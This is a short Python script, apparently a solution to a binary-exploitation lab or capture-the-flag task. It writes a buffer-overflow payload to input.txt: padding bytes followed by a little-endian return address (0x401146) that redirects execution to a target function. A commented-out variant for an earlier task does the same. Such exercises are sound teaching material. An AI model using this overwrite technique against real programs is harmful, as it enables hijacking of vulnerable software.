#!/usr/bin/env python3
#  import sys

import numpy as np

def randbytes(n):
    return np.random.bytes(n)

def p64(n):
    return n.to_bytes(8, "little")

## task 1
#  intro = b"A" * 40
#  addr  = p64(0x400b96)
#  task1 = b"1\n" + intro + addr + b"\n"

## task 2

intro = b"A" * 20
goal_addr = p64(0x401146)
exploit = intro + goal_addr + b"\n"

with open("input.txt", "wb") as f:
    f.write(exploit)
